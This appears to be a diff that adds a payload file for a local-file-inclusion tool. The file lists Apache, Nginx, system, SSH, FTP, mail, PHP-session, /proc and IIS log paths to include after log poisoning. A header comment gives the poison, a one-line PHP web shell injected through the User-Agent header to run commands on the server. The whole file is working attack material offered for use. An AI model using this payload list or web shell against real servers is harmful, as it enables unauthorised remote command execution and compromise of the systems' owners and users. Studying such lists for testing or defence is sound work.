@@ -1,0 +1,53 @@
+# m7lfi - Log Poisoning Payloads
+# Milkyway Intelligence | Sharlix
+# These are the FILE INCLUSION targets (the log files to include after poisoning)
+# Actual poison goes in User-Agent header as: <?php system($_GET['cmd']); ?>
+
+# Apache logs
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/httpd/access_log
+/var/log/httpd/error_log
+/usr/local/apache/log/error_log
+/usr/local/apache2/log/error_log
+
+# Nginx logs
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+
+# Auth / system logs
+/var/log/auth.log
+/var/log/syslog
+/var/log/messages
+/var/log/mail.log
+/var/log/daemon.log
+
+# SSH log (if SSH login is possible before inclusion)
+/var/log/secure
+/var/log/faillog
+
+# PHP session files
+/tmp/sess_
+/var/lib/php/sessions/sess_
+/var/lib/php5/sess_
+/var/tmp/sess_
+
+# /proc FD (direct pipe, no prior poisoning needed)
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/fd/2
+/proc/self/fd/3
+/proc/self/fd/4
+/proc/self/fd/5
+
+# vsftpd log (if FTP is accessible)
+/var/log/vsftpd.log
+/var/log/ftp.log
+
+# Mail log (SMTP to poison)
+/var/mail/root
+/var/spool/mail/root
+
+# Windows IIS logs
+C:/inetpub/logs/LogFiles/W3SVC1/u_ex*.log
+C:/Windows/System32/LogFiles/HTTPERR/httperr*.log
